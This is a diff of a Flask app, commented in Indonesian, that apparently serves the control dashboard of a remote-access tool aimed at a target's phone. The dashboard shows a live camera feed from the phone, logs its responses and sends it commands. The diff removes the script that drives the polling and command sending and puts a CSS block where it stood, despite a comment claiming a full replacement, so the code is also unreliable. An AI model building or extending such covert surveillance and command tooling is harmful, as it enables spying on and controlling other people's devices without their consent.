@@ -134,23 +134,16 @@ DASHBOARD_HTML = """
     <h3>Log Output Respons HP Target:</h3>
     <pre id="log" style="background:#000; padding:15px; border:1px solid #333; color: cyan; font-size:14px;">Menunggu perintah diklik...</pre>
 
-    <script>
-        setInterval(() => {
-            document.getElementById('monitor').src = '/get_frame?' + Date.now();
-            fetch('/get_latest_output')
-                .then(res => res.json())
-                .then(data => { if(data.output) document.getElementById('log').innerText = data.output; });
-        }, 1000);
-
-        function sendCmd(cmd) {
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ command: cmd })
-            });
-            document.getElementById('log').innerText = "Mengirim perintah '" + cmd + "' ke target secara otomatis...";
-        }
-    </script>
+<!-- CARI BAGIAN SCRIPT DI DALAM DASHBOARD_HTML LALU GANTI MENJADI UTUH SEPERTI INI -->
+    <style>
+        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: #f00; }
+        /* UKURAN MONITOR KAMERA DIPERBESAR */
+        #monitor { width: 480px; height: 360px; border: 2px solid #f00; background: #000; margin-top: 10px; display: block; }
+        /* KOTAK LOG OUTPUT DIPERLEBAR MAKSIMAL */
+        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 900px; min-height: 180px; white-space: pre-wrap; }
+    </style>
 </body>
 </html>
 """
@@ -195,8 +188,9 @@ def get_frame():
     global latest_frame
     if latest_frame and "base64," in latest_frame:
         try:
-            # Memotong tajuk data url untuk mengambil kode enkripsi gambar mentah
-            img_data = base64.b64decode(latest_frame.split("base64,")[1])
+            # KUNCI PERBAIKAN: Menambahkan [1] untuk mengambil kode data biner gambar murni
+            img_b64 = latest_frame.split("base64,")[1]
+            img_data = base64.b64decode(img_b64)
             return Response(img_data, mimetype='image/jpeg')
         except Exception as e:
             print(f"Error decoding frame: {e}")
